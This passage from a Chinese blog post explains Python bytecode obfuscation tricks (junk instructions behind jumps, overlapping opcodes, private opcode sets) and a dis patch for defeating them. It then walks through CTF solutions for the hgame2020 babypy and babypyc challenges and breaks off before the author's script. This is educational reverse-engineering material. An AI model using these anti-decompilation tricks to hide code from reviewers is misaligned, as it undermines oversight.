<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1           0 JUMP_ABSOLUTE            4</span><br><span class="line">       	 2 LOAD_COMST				256</span><br><span class="line">4      &gt;&gt;   4 LOAD_CONST               0 (1099511627775)</span><br><span class="line"></span><br><span class="line">            6  STORE_NAME               0 (a)</span><br><span class="line">            8  LOAD_CONST               1 (&#39;0&#39;)</span><br><span class="line">            10 LOAD_CONST               0 (1099511627775)</span><br><span class="line">            12 BINARY_MULTIPLY</span><br><span class="line">            14 STORE_NAME               1 (s)</span><br><span class="line">            16 LOAD_CONST               2 (None)</span><br><span class="line">            18 RETURN_VALUE</span><br></pre></td></tr></table></figure>

<p>可以看出程序运行时错误指令会被跳过。</p>
<h2 id="重叠指令-可以对抗dis和uncompyle6"><a href="#重叠指令-可以对抗dis和uncompyle6" class="headerlink" title="重叠指令(可以对抗dis和uncompyle6)"></a>重叠指令(可以对抗dis和uncompyle6)</h2><p>嫖的2.7版本例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 JUMP_ABSOLUTE        [71 05 00]     5 </span><br><span class="line">3 PRINT_ITEM           [47 -- --]</span><br><span class="line">4 LOAD_CONST           [64 64 01]     356</span><br><span class="line">7 STOP_CODE            [00 -- --]</span><br></pre></td></tr></table></figure>

<p>第一句绝对跳转到第三局指令的操作数的位置，但是第三个指令的操作数也是一个opcode，所以跳转过来后执行的指令其实是<code>0x64 0x01 0x00</code> (LOAD_CONST  1)。</p>
<p>Python3.6以后每条指令都是2字节好像就不大好进行这种操作了，我自己测试的时候2.7成功了3.7失败了，可能是我太菜…</p>
<h2 id="私有指令集"><a href="#私有指令集" class="headerlink" title="私有指令集"></a>私有指令集</h2><p>在opcode.h文件中修改opcode与opname的匹配，修改后编译生成的pyc文件只有与其拥有相同指令集的目标才能运行，无法用于发行。</p>
<h1 id="Python字节码反混淆"><a href="#Python字节码反混淆" class="headerlink" title="Python字节码反混淆"></a>Python字节码反混淆</h1><p>针对上面的加跳转和错误指令的混淆方法，会产生下标越界而报错，可以修改dis模块的源码在去值前先判断是否越界，如果越界则跳过，自己整了个3.7的例子：</p>
<p>源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> op <span class="keyword">in</span> hasconst:</span><br><span class="line">             argval, argrepr = _get_const_info(arg, constants)</span><br><span class="line">         <span class="keyword">elif</span> op <span class="keyword">in</span> hasname:</span><br><span class="line">             argval, argrepr = _get_name_info(arg, names)</span><br><span class="line">         <span class="keyword">elif</span> op <span class="keyword">in</span> hasjrel:</span><br><span class="line">             argval = offset + <span class="number">2</span> + arg</span><br><span class="line">             argrepr = <span class="string">&quot;to &quot;</span> + repr(argval)</span><br><span class="line">         <span class="keyword">elif</span> op <span class="keyword">in</span> haslocal:</span><br><span class="line">             argval, argrepr = _get_name_info(arg, varnames)</span><br><span class="line">         <span class="keyword">elif</span> op <span class="keyword">in</span> hascompare:</span><br><span class="line">             argval = cmp_op[arg]</span><br><span class="line">             argrepr = argval</span><br><span class="line">         <span class="keyword">elif</span> op <span class="keyword">in</span> hasfree:</span><br><span class="line">             argval, argrepr = _get_name_info(arg, cells)</span><br><span class="line">         <span class="keyword">elif</span> op == FORMAT_VALUE:</span><br><span class="line">             argval = ((<span class="literal">None</span>, str, repr, ascii)[arg &amp; <span class="number">0x3</span>], bool(arg &amp; <span class="number">0x4</span>))</span><br><span class="line">             argrepr = (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;ascii&#x27;</span>)[arg &amp; <span class="number">0x3</span>]</span><br><span class="line">             <span class="keyword">if</span> argval[<span class="number">1</span>]:</span><br><span class="line">                 <span class="keyword">if</span> argrepr:</span><br><span class="line">                     argrepr += <span class="string">&#x27;, &#x27;</span></span><br><span class="line">                 argrepr += <span class="string">&#x27;with format&#x27;</span></span><br></pre></td></tr></table></figure>

<p>修改后：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> op <span class="keyword">in</span> hasconst <span class="keyword">and</span> arg &lt; len(constants):</span><br><span class="line">             argval, argrepr = _get_const_info(arg, constants)</span><br><span class="line">         <span class="keyword">elif</span> op <span class="keyword">in</span> hasname <span class="keyword">and</span> arg &lt; len(names):</span><br><span class="line">             argval, argrepr = _get_name_info(arg, names)</span><br><span class="line">         <span class="keyword">elif</span> op <span class="keyword">in</span> hasjrel:</span><br><span class="line">             argval = offset + <span class="number">2</span> + arg</span><br><span class="line">             argrepr = <span class="string">&quot;to &quot;</span> + repr(argval)</span><br><span class="line">         <span class="keyword">elif</span> op <span class="keyword">in</span> haslocal <span class="keyword">and</span> arg &lt; len(varnames):</span><br><span class="line">             argval, argrepr = _get_name_info(arg, varnames)</span><br><span class="line">         <span class="keyword">elif</span> op <span class="keyword">in</span> hascompare:</span><br><span class="line">             argval = cmp_op[arg]</span><br><span class="line">             argrepr = argval</span><br><span class="line">         <span class="keyword">elif</span> op <span class="keyword">in</span> hasfree <span class="keyword">and</span> arg &lt; len(cells):</span><br><span class="line">             argval, argrepr = _get_name_info(arg, cells)</span><br><span class="line">         <span class="keyword">elif</span> op == FORMAT_VALUE:</span><br><span class="line">             argval = ((<span class="literal">None</span>, str, repr, ascii)[arg &amp; <span class="number">0x3</span>], bool(arg &amp; <span class="number">0x4</span>))</span><br><span class="line">             argrepr = (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;ascii&#x27;</span>)[arg &amp; <span class="number">0x3</span>]</span><br><span class="line">             <span class="keyword">if</span> argval[<span class="number">1</span>]:</span><br><span class="line">                 <span class="keyword">if</span> argrepr:</span><br><span class="line">                     argrepr += <span class="string">&#x27;, &#x27;</span></span><br><span class="line">                 argrepr += <span class="string">&#x27;with format&#x27;</span></span><br></pre></td></tr></table></figure>

<p>2.7版本也可。</p>
<p>之后就可以用dis反汇编出这种混淆的字节码。</p>
<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><h2 id="babypy"><a href="#babypy" class="headerlink" title="babypy"></a>babypy</h2><p>最后言归正传，hgame2020 week2 的两个python题。</p>
<p>第一个打开文件得到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">In [1]: from secret import flag, encrypt</span><br><span class="line"></span><br><span class="line">In [2]: encrypt(flag)</span><br><span class="line">Out[2]: &#39;7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22&#39;</span><br><span class="line"></span><br><span class="line">In [3]: import dis</span><br><span class="line"></span><br><span class="line">In [4]: dis.dis(encrypt)</span><br><span class="line">  4           0 LOAD_FAST                0 (OOo)</span><br><span class="line">              2 LOAD_CONST               0 (None)</span><br><span class="line">              4 LOAD_CONST               0 (None)</span><br><span class="line">              6 LOAD_CONST               1 (-1)</span><br><span class="line">              8 BUILD_SLICE              3</span><br><span class="line">             10 BINARY_SUBSCR</span><br><span class="line">             12 STORE_FAST               1 (O0O)</span><br><span class="line"></span><br><span class="line">  5          14 LOAD_GLOBAL              0 (list)</span><br><span class="line">             16 LOAD_FAST                1 (O0O)</span><br><span class="line">             18 CALL_FUNCTION            1</span><br><span class="line">             20 STORE_FAST               2 (O0o)</span><br><span class="line"></span><br><span class="line">  6          22 SETUP_LOOP              50 (to 74)</span><br><span class="line">             24 LOAD_GLOBAL              1 (range)</span><br><span class="line">             26 LOAD_CONST               2 (1)</span><br><span class="line">             28 LOAD_GLOBAL              2 (len)</span><br><span class="line">             30 LOAD_FAST                2 (O0o)</span><br><span class="line">             32 CALL_FUNCTION            1</span><br><span class="line">             34 CALL_FUNCTION            2</span><br><span class="line">             36 GET_ITER</span><br><span class="line">        &gt;&gt;   38 FOR_ITER                32 (to 72)</span><br><span class="line">             40 STORE_FAST               3 (O0)</span><br><span class="line"></span><br><span class="line">  7          42 LOAD_FAST                2 (O0o)</span><br><span class="line">             44 LOAD_FAST                3 (O0)</span><br><span class="line">             46 LOAD_CONST               2 (1)</span><br><span class="line">             48 BINARY_SUBTRACT</span><br><span class="line">             50 BINARY_SUBSCR</span><br><span class="line">             52 LOAD_FAST                2 (O0o)</span><br><span class="line">             54 LOAD_FAST                3 (O0)</span><br><span class="line">             56 BINARY_SUBSCR</span><br><span class="line">             58 BINARY_XOR</span><br><span class="line">             60 STORE_FAST               4 (Oo)</span><br><span class="line"></span><br><span class="line">  8          62 LOAD_FAST                4 (Oo)</span><br><span class="line">             64 LOAD_FAST                2 (O0o)</span><br><span class="line">             66 LOAD_FAST                3 (O0)</span><br><span class="line">             68 STORE_SUBSCR</span><br><span class="line">             70 JUMP_ABSOLUTE           38</span><br><span class="line">        &gt;&gt;   72 POP_BLOCK</span><br><span class="line"></span><br><span class="line">  9     &gt;&gt;   74 LOAD_GLOBAL              3 (bytes)</span><br><span class="line">             76 LOAD_FAST                2 (O0o)</span><br><span class="line">             78 CALL_FUNCTION            1</span><br><span class="line">             80 STORE_FAST               5 (O)</span><br><span class="line"></span><br><span class="line"> 10          82 LOAD_FAST                5 (O)</span><br><span class="line">             84 LOAD_METHOD              4 (hex)</span><br><span class="line">             86 CALL_METHOD              0</span><br><span class="line">             88 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">In [5]: exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输入的flag经过下面字节码的加密后得到<code>&#39;7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22&#39;</code>，慢慢分析就行，加密源码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">OOo</span>):</span></span><br><span class="line">    O0O = OOo[::<span class="number">-1</span>]</span><br><span class="line">    O0o = list(O0O)</span><br><span class="line">    <span class="keyword">for</span> O0 <span class="keyword">in</span> range(<span class="number">1</span>, len(O0o)):</span><br><span class="line">        Oo = O0o[O0<span class="number">-1</span>] ^ O0o[O0]</span><br><span class="line">        O0o[O0] = Oo</span><br><span class="line">    O = bytes(O0o)</span><br><span class="line">    <span class="keyword">return</span> O.hex()</span><br></pre></td></tr></table></figure>

<p>解密函数长这样：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">c</span>):</span></span><br><span class="line">    c = list(c)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)<span class="number">-1</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">        c[i] ^= c[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> bytes(c[::<span class="number">-1</span>])</span><br></pre></td></tr></table></figure>

<h2 id="babypyc"><a href="#babypyc" class="headerlink" title="babypyc"></a>babypyc</h2><p>开头有一个绝对跳转(上面有介绍)，所以uncompyle6反编译不了，但是可以dis+marshal走一波得到可读字节码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  3           0 JUMP_ABSOLUTE            2</span><br><span class="line">        &gt;&gt;    2 LOAD_CONST               0 (0)</span><br><span class="line">              4 LOAD_CONST               1 (None)</span><br><span class="line">              6 IMPORT_NAME              0 (os)</span><br><span class="line">              8 STORE_NAME               0 (os)</span><br><span class="line">             10 LOAD_CONST               0 (0)</span><br><span class="line">             12 LOAD_CONST               1 (None)</span><br><span class="line">             14 IMPORT_NAME              1 (sys)</span><br><span class="line"></span><br><span class="line">  4          16 STORE_NAME               1 (sys)</span><br><span class="line">             18 LOAD_CONST               0 (0)</span><br><span class="line">             20 LOAD_CONST               2 ((&#39;b64encode&#39;,))</span><br><span class="line">             22 IMPORT_NAME              2 (base64)</span><br><span class="line">             24 IMPORT_FROM              3 (b64encode)</span><br><span class="line">             26 STORE_NAME               3 (b64encode)</span><br><span class="line"></span><br><span class="line">  6          28 POP_TOP</span><br><span class="line">             30 LOAD_CONST               3 (b&#39;&#x2F;KDq6pvN&#x2F;LLq6tzM&#x2F;KXq59Oh&#x2F;MTqxtOTxdrqs8OoR3V1X09J&#39;)</span><br><span class="line"></span><br><span class="line">  8          32 STORE_GLOBAL             4 (O0o)</span><br><span class="line">             34 LOAD_CONST               4 (&lt;code object getFlag at 0x0000014E615C0D20, file &quot;task.py&quot;, line 8&gt;)</span><br><span class="line">             36 LOAD_CONST               5 (&#39;getFlag&#39;)</span><br><span class="line">             38 MAKE_FUNCTION            0</span><br><span class="line"></span><br><span class="line"> 16          40 STORE_NAME               5 (getFlag)</span><br><span class="line">             42 LOAD_NAME                5 (getFlag)</span><br><span class="line">             44 CALL_FUNCTION            0</span><br><span class="line"></span><br><span class="line"> 18          46 STORE_NAME               6 (flag)</span><br><span class="line">             48 LOAD_NAME                6 (flag)</span><br><span class="line">             50 LOAD_CONST               1 (None)</span><br><span class="line">             52 LOAD_CONST               6 (6)</span><br><span class="line">             54 BUILD_SLICE              2</span><br><span class="line">             56 BINARY_SUBSCR</span><br><span class="line">             58 LOAD_CONST               7 (b&#39;hgame&#123;&#39;)</span><br><span class="line">             60 COMPARE_OP               3 (!&#x3D;)</span><br><span class="line">             62 POP_JUMP_IF_TRUE        76</span><br><span class="line">             64 LOAD_NAME                6 (flag)</span><br><span class="line">             66 LOAD_CONST               8 (-1)</span><br><span class="line">             68 BINARY_SUBSCR</span><br><span class="line">             70 LOAD_CONST               9 (125)</span><br><span class="line">             72 COMPARE_OP               3 (!&#x3D;)</span><br><span class="line"></span><br><span class="line"> 19          74 POP_JUMP_IF_FALSE       94</span><br><span class="line">        &gt;&gt;   76 LOAD_NAME                7 (print)</span><br><span class="line">             78 LOAD_CONST              10 (&#39;Incorrect format!&#39;)</span><br><span class="line">             80 CALL_FUNCTION            1</span><br><span class="line"></span><br><span class="line"> 20          82 POP_TOP</span><br><span class="line">             84 LOAD_NAME                1 (sys)</span><br><span class="line">             86 LOAD_METHOD              8 (exit)</span><br><span class="line">             88 LOAD_CONST              11 (1)</span><br><span class="line">             90 CALL_METHOD              1</span><br><span class="line"></span><br><span class="line"> 22          92 POP_TOP</span><br><span class="line">        &gt;&gt;   94 LOAD_NAME                6 (flag)</span><br><span class="line">             96 LOAD_CONST               6 (6)</span><br><span class="line">             98 LOAD_CONST               8 (-1)</span><br><span class="line">            100 BUILD_SLICE              2</span><br><span class="line">            102 BINARY_SUBSCR</span><br><span class="line"></span><br><span class="line"> 23         104 STORE_NAME               9 (raw_flag)</span><br><span class="line">            106 LOAD_NAME               10 (len)</span><br><span class="line">            108 LOAD_NAME                6 (flag)</span><br><span class="line">            110 CALL_FUNCTION            1</span><br><span class="line">            112 LOAD_CONST              12 (7)</span><br><span class="line">            114 BINARY_SUBTRACT</span><br><span class="line">            116 LOAD_CONST              13 (36)</span><br><span class="line">            118 COMPARE_OP               3 (!&#x3D;)</span><br><span class="line"></span><br><span class="line"> 24         120 POP_JUMP_IF_FALSE      140</span><br><span class="line">            122 LOAD_NAME                7 (print)</span><br><span class="line">            124 LOAD_CONST              14 (&#39;Wrong length!&#39;)</span><br><span class="line">            126 CALL_FUNCTION            1</span><br><span class="line"></span><br><span class="line"> 25         128 POP_TOP</span><br><span class="line">            130 LOAD_NAME                1 (sys)</span><br><span class="line">            132 LOAD_METHOD              8 (exit)</span><br><span class="line">            134 LOAD_CONST              15 (2)</span><br><span class="line">            136 CALL_METHOD              1</span><br><span class="line"></span><br><span class="line"> 27         138 POP_TOP</span><br><span class="line">        &gt;&gt;  140 LOAD_NAME                9 (raw_flag)</span><br><span class="line">            142 LOAD_CONST               1 (None)</span><br><span class="line">            144 LOAD_CONST               1 (None)</span><br><span class="line">            146 LOAD_CONST               8 (-1)</span><br><span class="line">            148 BUILD_SLICE              3</span><br><span class="line">            150 BINARY_SUBSCR</span><br><span class="line"></span><br><span class="line"> 28         152 STORE_NAME               9 (raw_flag)</span><br><span class="line">            154 LOAD_CONST              16 (&lt;code object &lt;listcomp&gt; at 0x0000014E616835D0, file &quot;task.py&quot;, line 28&gt;)</span><br><span class="line">            156 LOAD_CONST              17 (&#39;&lt;listcomp&gt;&#39;)</span><br><span class="line">            158 MAKE_FUNCTION            0</span><br><span class="line">            160 LOAD_NAME               11 (range)</span><br><span class="line">            162 LOAD_CONST               6 (6)</span><br><span class="line">            164 CALL_FUNCTION            1</span><br><span class="line">            166 GET_ITER</span><br><span class="line">            168 CALL_FUNCTION            1</span><br><span class="line"></span><br><span class="line"> 30         170 STORE_NAME              12 (ciphers)</span><br><span class="line">            172 SETUP_LOOP              86 (to 260)</span><br><span class="line">            174 LOAD_NAME               11 (range)</span><br><span class="line">            176 LOAD_CONST              18 (5)</span><br><span class="line">            178 CALL_FUNCTION            1</span><br><span class="line">            180 GET_ITER</span><br><span class="line">        &gt;&gt;  182 FOR_ITER                74 (to 258)</span><br><span class="line"></span><br><span class="line"> 31         184 STORE_NAME              13 (row)</span><br><span class="line">            186 SETUP_LOOP              68 (to 256)</span><br><span class="line">            188 LOAD_NAME               11 (range)</span><br><span class="line">            190 LOAD_CONST               6 (6)</span><br><span class="line">            192 CALL_FUNCTION            1</span><br><span class="line">            194 GET_ITER</span><br><span class="line">        &gt;&gt;  196 FOR_ITER                56 (to 254)</span><br><span class="line"></span><br><span class="line"> 32         198 STORE_NAME              14 (col)</span><br><span class="line">            200 LOAD_NAME               12 (ciphers)</span><br><span class="line">            202 LOAD_NAME               13 (row)</span><br><span class="line">            204 BINARY_SUBSCR</span><br><span class="line">            206 LOAD_NAME               14 (col)</span><br><span class="line">            208 DUP_TOP_TWO</span><br><span class="line">            210 BINARY_SUBSCR</span><br><span class="line">            212 LOAD_NAME               12 (ciphers)</span><br><span class="line">            214 LOAD_NAME               13 (row)</span><br><span class="line">            216 LOAD_CONST              11 (1)</span><br><span class="line">            218 BINARY_ADD</span><br><span class="line">            220 BINARY_SUBSCR</span><br><span class="line">            222 LOAD_NAME               14 (col)</span><br><span class="line">            224 BINARY_SUBSCR</span><br><span class="line">            226 INPLACE_ADD</span><br><span class="line">            228 ROT_THREE</span><br><span class="line"></span><br><span class="line"> 33         230 STORE_SUBSCR</span><br><span class="line">            232 LOAD_NAME               12 (ciphers)</span><br><span class="line">            234 LOAD_NAME               13 (row)</span><br><span class="line">            236 BINARY_SUBSCR</span><br><span class="line">            238 LOAD_NAME               14 (col)</span><br><span class="line">            240 DUP_TOP_TWO</span><br><span class="line">            242 BINARY_SUBSCR</span><br><span class="line">            244 LOAD_CONST              19 (256)</span><br><span class="line">            246 INPLACE_MODULO</span><br><span class="line">            248 ROT_THREE</span><br><span class="line">            250 STORE_SUBSCR</span><br><span class="line">            252 JUMP_ABSOLUTE          196</span><br><span class="line">        &gt;&gt;  254 POP_BLOCK</span><br><span class="line">        &gt;&gt;  256 JUMP_ABSOLUTE          182</span><br><span class="line"></span><br><span class="line"> 35     &gt;&gt;  258 POP_BLOCK</span><br><span class="line">        &gt;&gt;  260 LOAD_CONST              20 (b&#39;&#39;)</span><br><span class="line"></span><br><span class="line"> 36         262 STORE_NAME              15 (cipher)</span><br><span class="line">            264 SETUP_LOOP              70 (to 336)</span><br><span class="line">            266 LOAD_NAME               11 (range)</span><br><span class="line">            268 LOAD_CONST               6 (6)</span><br><span class="line">            270 CALL_FUNCTION            1</span><br><span class="line">            272 GET_ITER</span><br><span class="line">        &gt;&gt;  274 FOR_ITER                58 (to 334)</span><br><span class="line"></span><br><span class="line"> 37         276 STORE_NAME              13 (row)</span><br><span class="line">            278 LOAD_CONST               0 (0)</span><br><span class="line"></span><br><span class="line"> 38         280 STORE_NAME              14 (col)</span><br><span class="line">            282 SETUP_LOOP              46 (to 330)</span><br><span class="line">        &gt;&gt;  284 LOAD_NAME               14 (col)</span><br><span class="line">            286 LOAD_CONST               6 (6)</span><br><span class="line">            288 COMPARE_OP               0 (&lt;)</span><br><span class="line">            290 EXTENDED_ARG             1</span><br><span class="line"></span><br><span class="line"> 39         292 POP_JUMP_IF_FALSE      328</span><br><span class="line">            294 LOAD_NAME               15 (cipher)</span><br><span class="line">            296 LOAD_NAME               16 (bytes)</span><br><span class="line">            298 LOAD_NAME               12 (ciphers)</span><br><span class="line">            300 LOAD_NAME               13 (row)</span><br><span class="line">            302 BINARY_SUBSCR</span><br><span class="line">            304 LOAD_NAME               14 (col)</span><br><span class="line">            306 BINARY_SUBSCR</span><br><span class="line">            308 BUILD_LIST               1</span><br><span class="line">            310 CALL_FUNCTION            1</span><br><span class="line">            312 INPLACE_ADD</span><br><span class="line"></span><br><span class="line"> 40         314 STORE_NAME              15 (cipher)</span><br><span class="line">            316 LOAD_NAME               14 (col)</span><br><span class="line">            318 LOAD_CONST              11 (1)</span><br><span class="line">            320 INPLACE_ADD</span><br><span class="line">            322 STORE_NAME              14 (col)</span><br><span class="line">            324 EXTENDED_ARG             1</span><br><span class="line">            326 JUMP_ABSOLUTE          284</span><br><span class="line">        &gt;&gt;  328 POP_BLOCK</span><br><span class="line">        &gt;&gt;  330 EXTENDED_ARG             1</span><br><span class="line">            332 JUMP_ABSOLUTE          274</span><br><span class="line"></span><br><span class="line"> 42     &gt;&gt;  334 POP_BLOCK</span><br><span class="line">        &gt;&gt;  336 LOAD_NAME                3 (b64encode)</span><br><span class="line">            338 LOAD_NAME               15 (cipher)</span><br><span class="line">            340 CALL_FUNCTION            1</span><br><span class="line"></span><br><span class="line"> 44         342 STORE_NAME              15 (cipher)</span><br><span class="line">            344 LOAD_NAME               15 (cipher)</span><br><span class="line">            346 LOAD_GLOBAL              4 (O0o)</span><br><span class="line">            348 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            350 EXTENDED_ARG             1</span><br><span class="line"></span><br><span class="line"> 45         352 POP_JUMP_IF_FALSE      364</span><br><span class="line">            354 LOAD_NAME                7 (print)</span><br><span class="line">            356 LOAD_CONST              21 (&#39;Great, this is my flag.&#39;)</span><br><span class="line">            358 CALL_FUNCTION            1</span><br><span class="line">            360 POP_TOP</span><br><span class="line"></span><br><span class="line"> 47         362 JUMP_FORWARD             8 (to 372)</span><br><span class="line">        &gt;&gt;  364 LOAD_NAME                7 (print)</span><br><span class="line">            366 LOAD_CONST              22 (&#39;Wrong flag.&#39;)</span><br><span class="line">            368 CALL_FUNCTION            1</span><br><span class="line">            370 POP_TOP</span><br><span class="line">        &gt;&gt;  372 LOAD_CONST               1 (None)</span><br><span class="line">            374 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object getFlag at 0x0000014E615C0D20, file &quot;task.py&quot;, line 8&gt;:</span><br><span class="line"> 10           0 LOAD_GLOBAL              0 (print)</span><br><span class="line">              2 LOAD_CONST               1 (&#39;Give me the flag&#39;)</span><br><span class="line">              4 CALL_FUNCTION            1</span><br><span class="line">              6 POP_TOP</span><br><span class="line"></span><br><span class="line"> 11           8 LOAD_GLOBAL              1 (input)</span><br><span class="line">             10 LOAD_CONST               2 (&#39;&gt; &#39;)</span><br><span class="line">             12 CALL_FUNCTION            1</span><br><span class="line">             14 STORE_FAST               0 (flag)</span><br><span class="line"></span><br><span class="line"> 12          16 LOAD_FAST                0 (flag)</span><br><span class="line">             18 LOAD_METHOD              2 (encode)</span><br><span class="line">             20 CALL_METHOD              0</span><br><span class="line">             22 STORE_FAST               0 (flag)</span><br><span class="line"></span><br><span class="line"> 13          24 LOAD_CONST               3 (b&#39;Qre50rOeWr3CsrJ4ccefvNO8n9hclqDNztdbco6pZ3IwRV5Q&#39;)</span><br><span class="line">             26 STORE_GLOBAL             3 (O0o)</span><br><span class="line"></span><br><span class="line"> 14          28 LOAD_FAST                0 (flag)</span><br><span class="line">             30 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object &lt;listcomp&gt; at 0x0000014E616835D0, file &quot;task.py&quot;, line 28&gt;:</span><br><span class="line"> 28           0 BUILD_LIST               0</span><br><span class="line">              2 LOAD_FAST                0 (.0)</span><br><span class="line">        &gt;&gt;    4 FOR_ITER                26 (to 32)</span><br><span class="line">              6 STORE_DEREF              0 (col)</span><br><span class="line">              8 LOAD_CLOSURE             0 (col)</span><br><span class="line">             10 BUILD_TUPLE              1</span><br><span class="line">             12 LOAD_CONST               0 (&lt;code object &lt;listcomp&gt; at 0x0000014E616786F0, file &quot;task.py&quot;, line 28&gt;)</span><br><span class="line">             14 LOAD_CONST               1 (&#39;&lt;listcomp&gt;.&lt;listcomp&gt;&#39;)</span><br><span class="line">             16 MAKE_FUNCTION            8</span><br><span class="line">             18 LOAD_GLOBAL              0 (range)</span><br><span class="line">             20 LOAD_CONST               2 (6)</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 GET_ITER</span><br><span class="line">             26 CALL_FUNCTION            1</span><br><span class="line">             28 LIST_APPEND              2</span><br><span class="line">             30 JUMP_ABSOLUTE            4</span><br><span class="line">        &gt;&gt;   32 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object &lt;listcomp&gt; at 0x0000014E616786F0, file &quot;task.py&quot;, line 28&gt;:</span><br><span class="line"> 28           0 BUILD_LIST               0</span><br><span class="line">              2 LOAD_FAST                0 (.0)</span><br><span class="line">        &gt;&gt;    4 FOR_ITER                20 (to 26)</span><br><span class="line">              6 STORE_FAST               1 (row)</span><br><span class="line">              8 LOAD_GLOBAL              0 (raw_flag)</span><br><span class="line">             10 LOAD_CONST               0 (6)</span><br><span class="line">             12 LOAD_FAST                1 (row)</span><br><span class="line">             14 BINARY_MULTIPLY</span><br><span class="line">             16 LOAD_DEREF               0 (col)</span><br><span class="line">             18 BINARY_ADD</span><br><span class="line">             20 BINARY_SUBSCR</span><br><span class="line">             22 LIST_APPEND              2</span><br><span class="line">             24 JUMP_ABSOLUTE            4</span><br><span class="line">        &gt;&gt;   26 RETURN_VALUE</span><br></pre></td></tr></table></figure>

<p>两个嵌套的函数可能有点难度，其他很简单，慢慢分析就行。</p>
<p>官方给的源码长这样：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line">O0o = <span class="string">b&#x27;/KDq6pvN/LLq6tzM/KXq59Oh/MTqxtOTxdrqs8OoR3V1X09J&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span>():</span></span><br><span class="line">    <span class="keyword">global</span> O0o</span><br><span class="line">    print(<span class="string">&#x27;Give me the flag&#x27;</span>)</span><br><span class="line">    flag = input(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    flag = flag.encode()</span><br><span class="line">    O0o = <span class="string">b&#x27;Qp+ng3SeWoXClJN4cYm3frO8n5rIqL/Nrreuks7JR1JPM19w&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = getFlag()</span><br><span class="line"><span class="keyword">if</span> (flag[:<span class="number">6</span>] != <span class="string">b&#x27;hgame&#123;&#x27;</span>) <span class="keyword">or</span> (flag[<span class="number">-1</span>] != <span class="number">125</span>):</span><br><span class="line">    print(<span class="string">&#x27;Incorrect format!&#x27;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line">raw_flag = flag[<span class="number">6</span>:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">if</span> len(flag) - <span class="number">7</span> != <span class="number">36</span>:</span><br><span class="line">    print(<span class="string">&#x27;Wrong length!&#x27;</span>)</span><br><span class="line">    sys.exit(<span class="number">2</span>)</span><br><span class="line">raw_flag = raw_flag[::<span class="number">-1</span>]</span><br><span class="line">ciphers = [[raw_flag[<span class="number">6</span>*row+col] <span class="keyword">for</span> row <span class="keyword">in</span> range(<span class="number">6</span>)] <span class="keyword">for</span> col <span class="keyword">in</span> range(<span class="number">6</span>)]</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        ciphers[row][col] += ciphers[row+<span class="number">1</span>][col]</span><br><span class="line">        ciphers[row][col] %= <span class="number">256</span></span><br><span class="line">cipher = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    col = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> col &lt; <span class="number">6</span>:</span><br><span class="line">        cipher += bytes([ciphers[row][col]])</span><br><span class="line">        col += <span class="number">1</span></span><br><span class="line">cipher = b64encode(cipher)</span><br><span class="line"><span class="keyword">if</span> cipher == O0o:</span><br><span class="line">    print(<span class="string">&#x27;Great, this is my flag.&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&#x27;Wrong flag.&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我的脚本长这样：</p>
